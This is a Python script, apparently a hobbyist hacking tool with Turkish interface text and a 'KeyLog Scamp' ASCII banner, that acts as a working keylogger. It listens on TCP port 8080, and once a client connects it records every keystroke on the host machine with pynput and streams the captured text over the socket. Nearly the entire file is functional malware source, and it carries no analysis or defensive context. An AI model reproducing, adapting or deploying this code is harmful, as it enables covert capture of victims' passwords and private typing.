#!/usr/bin/env python3
import socket
import os
import sys
import time
import threading
import itertools
import pynput.keyboard

RESET = "\033[0m"
BOLD = "\033[1m"
WHITE = "\033[97m"
GREEN = "\033[92m"
RED = "\033[91m"
MATRIX = GREEN + BOLD
MENU_WHITE = WHITE + BOLD

HOST = "0.0.0.0"
PORT = 8080

def bold(text):
    return f"{BOLD}{text}{RESET}"

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def loading_animation():
    clear_screen()
    spinner = itertools.cycle(["|", "/", "-", "\\"])
    print(f"{MENU_WHITE}Sistem aciliyor ", end="", flush=True)
    for _ in range(20):
        sys.stdout.write(next(spinner))
        sys.stdout.flush()
        time.sleep(0.15)
        sys.stdout.write("\b")
    print(f" {GREEN}Hosgeldiniz{RESET}\n")
    time.sleep(1)
    clear_screen()

def listen_animation(stop_event, port):
    frames = [f"Dinleniliyor Port:{bold(port)} /",
              f"Dinleniliyor Port:{bold(port)} -",
              f"Dinleniliyor Port:{bold(port)} \\"]
    idx = 0
    while not stop_event.is_set():
        print(f"\r{frames[idx % len(frames)]}", end="", flush=True)
        idx += 1
        time.sleep(0.3)
    print("\r" + " " * 50 + "\r", end="", flush=True)

def show_ascii_banner():
    banner = r"""
                                    .:.                                      
                                 -+:                                         
                       ..     .=%#.  :-=-:                 ..   .            
                     ++*%##***%%%%**#-                   .-::-:::::          
                    .+=+##++++*###*##+:-+*-               :::-::::.          
    ....              -===:::--==--=+=:-==#%-             .:---==            
   :#-......              .....:=++-....::.-=+-         .  :.-*%%.           
   #=..  . :+#.     .......:--+++**#%%*=: .=#@%*:       #%*#####=            
....     --=*%-    -=-#**++*=++*==@@@=-:   :+*#%.     :%%==##**#:            
  ....    -##=    :+*..=@@%#%*....-*+-:....=++*#:   -@@+.:.+###+             
   .:....-%#.     :+---:=+-:.=#*-:::.   .:+++++#  .+%%:. ... ....            
    *+.   :#:      =:. .:    .:::.     :=+++=+**. .+-.........-##=.          
           +#.      +*+==-:::::::...:=+++=++*+=  .%#... ......**+.           
            =-    -###**++===++++++++===+**- ..  ::...   .......             
            .***#%%+:    :---.....::-=+=:   :::... ...........  .:.          
             -%#=.           .**=. :**-    .:::.......=*...    :::-:.        
              .=             :**    =*=    .:::. ...  ++......... .:::.      
                             =*+    :*+    .::::....  .+.  .......:::::.     
                             ++-    .*+    .::::::.:.........:--::::::.      
                             =+      ++    -:.:::::::.......:--:....::       
                             -=     .*+   :-::.:::::::....-:::........       
                   ....---=. ==  -*#**=  .---:....-......:::........:.       
                  -*#*++:=#%@@%%#*-.     :-----::..................::.       
                    .+===+==+#+           :-----:....  ....::......:.        
                  -*#* .==+==*#=--.       .:-----::::...::.......:..         
              .  .-==+--+*==-----=-..........:---:............:.....         
                   :---==++====+++=...    .     ..:........:..........       
                   :::+++=-..-=+++*=             .....................       
                    .+#*=--=+**#*-*#-         .................              
                   .*##*+-+*+:*#=.:-.                                        
                   .-=.. .==  ..                                                                                                          
    """
    print(RED + banner + RESET)

    print(BOLD + WHITE + r""" _  __          _                    _____                           
| |/ /         | |                  / ____|                          
| ' / ___ _   _| |     ___   __ _  | (___   ___ __ _ _ __ ___  _ __  
|  < / _ \ | | | |    / _ \ / _` |  \___ \ / __/ _` | '_ ` _ \| '_ \ 
| . \  __/ |_| | |___| (_) | (_| |  ____) | (_| (_| | | | | | | |_) |
|_|\_\___|\__, |______\___/ \__, | |_____/ \___\__,_|_| |_| |_| .__/ 
           __/ |             __/ |                            | |    
          |___/             |___/                             |_|        
          
                   
""" + RESET)

def keylogger(conn):
    toplama = ""

    def on_press(key):
        nonlocal toplama
        try:
            toplama += str(key.char)
        except AttributeError:
            if key == key.space:
                toplama += " "
            elif key == key.backspace:
                toplama = toplama[:-1]
            elif key == key.enter:
                toplama += "\n"
            else:
                toplama += f"[{str(key)}]"
        
        try:
            conn.sendall(toplama.encode())
        except:
            pass 

    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()

def main():
    try:
        loading_animation()
        show_ascii_banner()

        stop_event = threading.Event()

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((HOST, PORT))
            s.listen()

            t = threading.Thread(target=listen_animation, args=(stop_event, PORT))
            t.start()

            conn, addr = s.accept()
            stop_event.set()
            t.join()

            print(MENU_WHITE + f"[+] Baglanti geldi: {addr}" + RESET)
            
            keylogger(conn)

            while True:
                time.sleep(1)

    except KeyboardInterrupt:
        stop_event.set()
        print(RED + "\n[!] Program Ctrl+C ile kapatildi." + RESET)
        sys.exit(0)

    except Exception as e:
        stop_event.set()
        print(RED + f"\n[!] Hata olustu: {e}" + RESET)
        sys.exit(1)

if __name__ == "__main__":
    main()
